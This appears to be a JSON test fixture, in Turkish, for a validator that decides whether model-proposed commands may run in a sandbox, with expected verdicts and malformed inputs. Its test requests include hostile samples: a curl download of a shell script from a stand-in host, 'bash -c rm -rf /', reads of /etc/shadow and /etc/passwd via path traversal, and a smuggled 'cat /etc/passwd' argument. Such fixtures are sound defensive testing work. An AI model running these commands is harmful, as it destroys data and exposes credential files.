@@ -1,0 +1,397 @@
+{
+ "aciklama": "Modelin önerdiği sentetik komutlar. Hiçbiri çalıştırılmaz; plan yalnız veri üretir. argv, kabuk olmadan ayrık öğelerdir.",
+ "profil": {
+  "kullanici": "sandbox",
+  "ag": false,
+  "kok": "/sandbox",
+  "izinli_programlar": [
+   "python",
+   "hesap"
+  ],
+  "max_sure_ms": 2000,
+  "max_cikti_bayt": 8192
+ },
+ "istekler": [
+  {
+   "id": "analiz",
+   "program": "python",
+   "argumanlar": [
+    "analiz.py",
+    "--girdi",
+    "veri/satis.csv"
+   ],
+   "calisma_dizini": "/sandbox/is",
+   "dosyalar": [
+    "analiz.py",
+    "veri/satis.csv"
+   ]
+  },
+  {
+   "id": "kok-dizin",
+   "program": "hesap",
+   "argumanlar": [
+    "2+2"
+   ],
+   "calisma_dizini": "/sandbox",
+   "dosyalar": []
+  },
+  {
+   "id": "indir",
+   "program": "curl",
+   "argumanlar": [
+    "-O",
+    "http://ornek.test/x.sh"
+   ],
+   "calisma_dizini": "/sandbox/is",
+   "dosyalar": [
+    "x.sh"
+   ]
+  },
+  {
+   "id": "kacis",
+   "program": "python",
+   "argumanlar": [
+    "oku.py"
+   ],
+   "calisma_dizini": "/sandbox/../etc",
+   "dosyalar": [
+    "oku.py"
+   ]
+  },
+  {
+   "id": "onek",
+   "program": "python",
+   "argumanlar": [
+    "oku.py"
+   ],
+   "calisma_dizini": "/sandboxx/is",
+   "dosyalar": [
+    "oku.py"
+   ]
+  },
+  {
+   "id": "gezinti",
+   "program": "python",
+   "argumanlar": [
+    "oku.py"
+   ],
+   "calisma_dizini": "/sandbox/is",
+   "dosyalar": [
+    "../../etc/shadow"
+   ]
+  },
+  {
+   "id": "mutlak",
+   "program": "python",
+   "argumanlar": [
+    "oku.py"
+   ],
+   "calisma_dizini": "/sandbox/is",
+   "dosyalar": [
+    "/etc/passwd"
+   ]
+  },
+  {
+   "id": "kabuk",
+   "program": "bash",
+   "argumanlar": [
+    "-c",
+    "rm -rf /"
+   ],
+   "calisma_dizini": "/tmp",
+   "dosyalar": [
+    "./x",
+    "a\\b"
+   ]
+  },
+  {
+   "id": "metakarakter",
+   "program": "python",
+   "argumanlar": [
+    "a.py; cat /etc/passwd"
+   ],
+   "calisma_dizini": "/sandbox/is",
+   "dosyalar": [
+    "a.py"
+   ]
+  }
+ ],
+ "beklenen": [
+  {
+   "id": "analiz",
+   "karar": "hazir",
+   "nedenler": [],
+   "argv": [
+    "python",
+    "analiz.py",
+    "--girdi",
+    "veri/satis.csv"
+   ]
+  },
+  {
+   "id": "gezinti",
+   "karar": "reddet",
+   "nedenler": [
+    "dosya"
+   ],
+   "argv": [
+    "python",
+    "oku.py"
+   ]
+  },
+  {
+   "id": "indir",
+   "karar": "reddet",
+   "nedenler": [
+    "program"
+   ],
+   "argv": [
+    "curl",
+    "-O",
+    "http://ornek.test/x.sh"
+   ]
+  },
+  {
+   "id": "kabuk",
+   "karar": "reddet",
+   "nedenler": [
+    "program",
+    "dizin",
+    "dosya"
+   ],
+   "argv": [
+    "bash",
+    "-c",
+    "rm -rf /"
+   ]
+  },
+  {
+   "id": "kacis",
+   "karar": "reddet",
+   "nedenler": [
+    "dizin"
+   ],
+   "argv": [
+    "python",
+    "oku.py"
+   ]
+  },
+  {
+   "id": "kok-dizin",
+   "karar": "hazir",
+   "nedenler": [],
+   "argv": [
+    "hesap",
+    "2+2"
+   ]
+  },
+  {
+   "id": "metakarakter",
+   "karar": "hazir",
+   "nedenler": [],
+   "argv": [
+    "python",
+    "a.py; cat /etc/passwd"
+   ]
+  },
+  {
+   "id": "mutlak",
+   "karar": "reddet",
+   "nedenler": [
+    "dosya"
+   ],
+   "argv": [
+    "python",
+    "oku.py"
+   ]
+  },
+  {
+   "id": "onek",
+   "karar": "reddet",
+   "nedenler": [
+    "dizin"
+   ],
+   "argv": [
+    "python",
+    "oku.py"
+   ]
+  }
+ ],
+ "bozuk_girdiler": [
+  {
+   "id": "x-01",
+   "aciklama": "yinelenen kimlik",
+   "girdi": [
+    {
+     "id": "analiz",
+     "program": "python",
+     "argumanlar": [
+      "analiz.py",
+      "--girdi",
+      "veri/satis.csv"
+     ],
+     "calisma_dizini": "/sandbox/is",
+     "dosyalar": [
+      "analiz.py",
+      "veri/satis.csv"
+     ]
+    },
+    {
+     "id": "kok-dizin",
+     "program": "hesap",
+     "argumanlar": [
+      "2+2"
+     ],
+     "calisma_dizini": "/sandbox",
+     "dosyalar": []
+    },
+    {
+     "id": "indir",
+     "program": "curl",
+     "argumanlar": [
+      "-O",
+      "http://ornek.test/x.sh"
+     ],
+     "calisma_dizini": "/sandbox/is",
+     "dosyalar": [
+      "x.sh"
+     ]
+    },
+    {
+     "id": "kacis",
+     "program": "python",
+     "argumanlar": [
+      "oku.py"
+     ],
+     "calisma_dizini": "/sandbox/../etc",
+     "dosyalar": [
+      "oku.py"
+     ]
+    },
+    {
+     "id": "onek",
+     "program": "python",
+     "argumanlar": [
+      "oku.py"
+     ],
+     "calisma_dizini": "/sandboxx/is",
+     "dosyalar": [
+      "oku.py"
+     ]
+    },
+    {
+     "id": "gezinti",
+     "program": "python",
+     "argumanlar": [
+      "oku.py"
+     ],
+     "calisma_dizini": "/sandbox/is",
+     "dosyalar": [
+      "../../etc/shadow"
+     ]
+    },
+    {
+     "id": "mutlak",
+     "program": "python",
+     "argumanlar": [
+      "oku.py"
+     ],
+     "calisma_dizini": "/sandbox/is",
+     "dosyalar": [
+      "/etc/passwd"
+     ]
+    },
+    {
+     "id": "kabuk",
+     "program": "bash",
+     "argumanlar": [
+      "-c",
+      "rm -rf /"
+     ],
+     "calisma_dizini": "/tmp",
+     "dosyalar": [
+      "./x",
+      "a\\b"
+     ]
+    },
+    {
+     "id": "metakarakter",
+     "program": "python",
+     "argumanlar": [
+      "a.py; cat /etc/passwd"
+     ],
+     "calisma_dizini": "/sandbox/is",
+     "dosyalar": [
+      "a.py"
+     ]
+    },
+    {
+     "id": "analiz",
+     "program": "python",
+     "argumanlar": [
+      "analiz.py",
+      "--girdi",
+      "veri/satis.csv"
+     ],
+     "calisma_dizini": "/sandbox/is",
+     "dosyalar": [
+      "analiz.py",
+      "veri/satis.csv"
+     ]
+    }
+   ]
+  },
+  {
+   "id": "x-02",
+   "aciklama": "argümanda NUL",
+   "girdi": [
+    {
+     "id": "analiz",
+     "program": "python",
+     "argumanlar": [
+      "a\u0000b"
+     ],
+     "calisma_dizini": "/sandbox/is",
+     "dosyalar": [
+      "analiz.py",
+      "veri/satis.csv"
+     ]
+    }
+   ]
+  },
+  {
+   "id": "x-03",
+   "aciklama": "201 karakterlik argüman",
+   "girdi": [
+    {
+     "id": "analiz",
+     "program": "python",
+     "argumanlar": [
+      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+     ],
+     "calisma_dizini": "/sandbox/is",
+     "dosyalar": [
+      "analiz.py",
+      "veri/satis.csv"
+     ]
+    }
+   ]
+  },
+  {
+   "id": "x-04",
+   "aciklama": "argümanlar tek metin",
+   "girdi": [
+    {
+     "id": "analiz",
+     "program": "python",
+     "argumanlar": "analiz.py --girdi x",
+     "calisma_dizini": "/sandbox/is",
+     "dosyalar": [
+      "analiz.py",
+      "veri/satis.csv"
+     ]
+    }
+   ]
+  }
+ ]
+}
